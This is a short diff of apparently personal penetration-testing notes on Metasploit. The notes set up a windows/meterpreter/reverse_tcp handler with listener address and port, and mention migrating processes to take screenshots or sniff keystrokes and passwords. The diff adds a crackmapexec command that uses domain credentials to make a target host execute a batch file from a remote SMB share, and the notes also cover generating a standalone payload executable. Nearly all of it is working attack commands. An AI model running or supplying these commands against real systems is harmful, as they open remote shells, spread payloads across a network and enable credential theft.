@@ -135,7 +135,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.122.1
 set LPORT 4444
 set ExitOnSession false
-set AutoRunScript multiscript -rc /path/to/meterpreter.rc
+set AutoRunScript multiscript -rc /path/to/meterpreter.rc # see https://github.com/rapid7/metasploit-framework/tree/master/scripts/meterpreter
 exploit -j -z
 
 meterpreter.rc:
@@ -149,6 +149,8 @@ might need to migrate to proper process to get screenshot or keylock-sniff-pw et
 ./msfconsole -r msf.rc
 
 shim2.exe <...>
+
+crackmapexec -d DOM -u foo -p bar --no-output -x '\\6.6.6.6\l\shim2.bat' 1.2.3.4
 
 # generate standalone exe from msfconsole
 generate -t exe -f blah.exe
